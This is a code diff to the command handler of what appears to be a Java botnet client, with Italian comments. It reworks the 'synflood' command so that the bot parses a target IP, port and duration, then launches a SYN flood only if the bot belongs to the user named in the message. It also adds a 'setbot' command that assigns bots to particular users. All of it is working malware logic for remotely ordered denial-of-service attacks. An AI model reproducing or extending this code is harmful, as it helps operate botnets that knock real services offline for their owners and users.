@@ -261,25 +261,30 @@ public class Behavior {
 		if (msg.startsWith("newking")) {
 			updateCecInfo(msg);
 		}
-		if (msg.startsWith("synfloood")) {
-			malS.synFlood(msg);
-		}
 		if (msg.startsWith("synflood")) {
 			//scompongo messaggio al fine di riempire i campi, codifica particolare <SA>
 			//TODO da fare
-			String[] msgs=msg.split("<SF>");
-			
+			String[] msgs=msg.split("<TT>");
 			IP ipDest=new IP(msgs[1].toString());
 			Integer portDest=Integer.parseInt(msgs[2].toString());
 			Integer time=Integer.parseInt(msgs[3].toString());
+			
+			if(nServ.getIdUser().equals(msgs[4].toString())){
+			System.out.println("Appartengo a utente "+nServ.getIdUser());
 			System.out.println("IpDest di attacco "+ipDest);
 			System.out.println("PortDest di attacco "+portDest);
 			System.out.println("Time di attacco "+time);
 			malS.synFlood(ipDest.toString(), portDest, time);
-
+			}
+			else
+				System.out.println("Non eseguo il comando, non sono di proprieta dell'utente");
 		}
-		if (msg.startsWith("")) {
-
+		if (msg.startsWith("setbot")) {
+			String[] msgs=msg.split("<BU>");
+			String idBot=msgs[1].toString();
+			String idUser=msgs[2].toString();
+			if(nServ.getIdHash().equals(idBot))
+				nServ.setIdUser(idUser);
 		}
 
 		// che comando è?
